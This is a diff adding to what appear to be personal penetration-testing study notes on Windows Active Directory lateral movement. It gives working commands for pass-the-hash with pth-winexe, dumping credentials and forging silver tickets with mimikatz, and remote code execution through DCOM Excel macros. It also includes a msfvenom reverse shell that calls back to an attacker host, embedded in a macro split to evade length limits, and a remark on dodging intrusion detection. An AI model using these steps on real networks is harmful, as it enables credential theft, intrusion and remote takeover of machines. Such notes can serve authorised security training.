@@ -255,4 +255,132 @@ This means you often don't need to decrypt a hash before it's usable.
 Pass the Hash:
 +++++++++++++++
 This only works for NTLM authenticaion, not Kerberos. However, a lot of stuff
-runs NTLM. Impacket, PsExec and passing-the-hash toolkit. 
+runs NTLM. Impacket, PsExec and passing-the-hash toolkit are good ways to 
+automate the attack. They all basically work by logging in to SMB and giving
+NTLM hashes as a login. Most PtH exploits create and start a Windows Service like 
+cmd or PS and communicate with it using Named Pipes via the Service Control
+Manager API. 
+
+To PtH you need to be able to log in to SMB and the Windows File and Print
+Sharing feature must be enabled on the network. PtH generally requires 
+local Admin Rights.
+
+pth-winexe -U <admin hash> //<IP> <command/process>
+
+If you ran the above with cmd as the command you would get a shell as 
+Admin from a user state. This works for AD domain accounts and the 
+built-in local admin. Since the 2014 Security update you cannot 
+PtH authenticate as any other local admin. 
+
+Overpass the Hash:
++++++++++++++++++++
+This method allows the abuse of an NTLM hash to get a TGT or service 
+ticket so we can access another machine or user. This way we don't have
+to deal with NTLM authentication. To do this, we need a machine with 
+cached local admin credentials. In mimikatz we can run 
+sekurlsa::logonpasswords 
+to recover these hashes and pass them into a PS instance with
+sekurlsa::pth /user:<localAdmin> /domain:<domain> /ntlm:<hash> /run:PowerShell.exe
+This will give us a shell as the local admin. If we klist now we will not see
+any cached tickets (or we might which would be nice). To generate a TGT we just have 
+to access a network resource which we can do with 
+net use \\dc01 
+where dc01 is a network share or other resource. klist after this and you will see a TGT
+in the cache. We can do this with any command that requires domain permissions. 
+This TGT lets us use any services that require Kerberos authentication like the real
+psexec from Microsoft. All we have to do to use our TGT is request services that would 
+need the ticket from our instance with the ticket cached.
+
+Pass the Ticket:
++++++++++++++++++
+TGTs are restricted to the machine they were created on. We can however abuse the TGS by
+exporting it and reinjecting it elsewhere in the network to authenticate to a specific service. 
+If the service tickets belong to the current user, no admin privs are required.
+No additional access is gleaned from this tech but you get more flexibility. 
+
+The service tickets in Kerberos are implicitly trusted by applications, so if you can 
+forge one that is accepted by an application you can run that app with whatever 
+perms you want. If that SPN is accessible from multiple machines, you can use your
+ticket from any machine. That's a silver ticket. mimikatz can make one with the 
+misleading kerberos::golden command. It will put the silver ticket straight into
+memory by doing this. Here are the things you need for a silver ticket:
+- The SID of the domain. SIDS have the structure S-R-I-S, where S1 is always S,
+	R is the revision level (usually 1), I is the Identifier Authority 
+	value (usually 5 in AD envs) and multiple Subauthority values (S2).
+	The Numeric Identifier is the part of S2 that's really long, and the
+	Relative Identifier (RID) is the last number at the end of the SID.
+	whoami /user throws your SID. The domain SID is your SID - your RID.
+- Your username and domain
+- the fqdn of your target service 
+- the service type
+- the password hash of the service account running that service
+
+Before you craft your ticket you need to clean everything out with kerberos::purge
+and verify the clearance with kerberos::list. Then you make the ticket like this:
+kerberos::golder /user:<user> /domain:<domain> /sid:<SID> /target:<resource>.<domain>
+	/service:<service> /rc4:<hash> /ptt
+
+Where service can be HTTP or some other shit. ptt tells mimikatz to inject the ticket 
+straight to memory. I'm talking right to the dome. klist now and you will see a new 
+service ticket for your target SPN. If you kerberoast and get a cleartext pass for 
+the service acct you have to hash it before making your ticket lol. Once you have your
+ticket just access the service it will all work out.
+
+Distributed Component Object Model:
+====================================
+The DCOM is an extension of COM which was a system for creating software components
+that interact with each other. COM was made for same-process and cross-process 
+interaction. DCOM extended it for interaction between multiple computers over a
+network. COM and DCOM are old as shit. You interact with DCOM over 135 (rpcclient). 
+Local Admin is the lowest level of access DCOM will pick up the phone for, but they
+can use the DCOM Service Control Manager. The SCM is basically an API. 
+DCOM objects related to M$ Office let you lateral through a network via Outlook 
+and Powerpoint as well as Excel.
+
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<IP>"))
+$com | Get-Member
+
+This will create an Excel instance on the workstation. Get-Member will give you
+a bunch of data on the running object, but the Run Method is what you want to 
+pay attention to. This method is how you run your VBA macros remotely.
+Make a macro:
+Sub mymacro()
+    Shell ("notepad.exe")
+End Sub
+And transfer that excel file with the macro to the remote machine:
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+Using the Open method of the Workbooks object will let us run the file:
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+$com.Run("mymacro")
+If you get an error on Open, try making a system profile:
+$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+$temp = [system.io.directory]::createDirectory($Path)
+This will fix issues occurring when a process executes as system but there
+is no system user profile (DCs). Running the macro will execute the command.
+
+The example macro just opened notepad, but we can get shell with this:
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
+and pulling the powershell.exe -nop -w hidden -e [encoded command] part of the file.
+The following python script will get around the character limit:
+str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
+n = 50
+for i in range(0, len(str), n):
+	print "Str = Str + " + '"' + str[i:i+n] + '"'
+
+Macro will look like:
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
+    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
+    ...
+    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
+    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
+    Shell (Str)
+End Sub
+
+This is a new vector and if you have 135 and 445 you can probably do it 
+to avoid NIDs or host-based IDS.
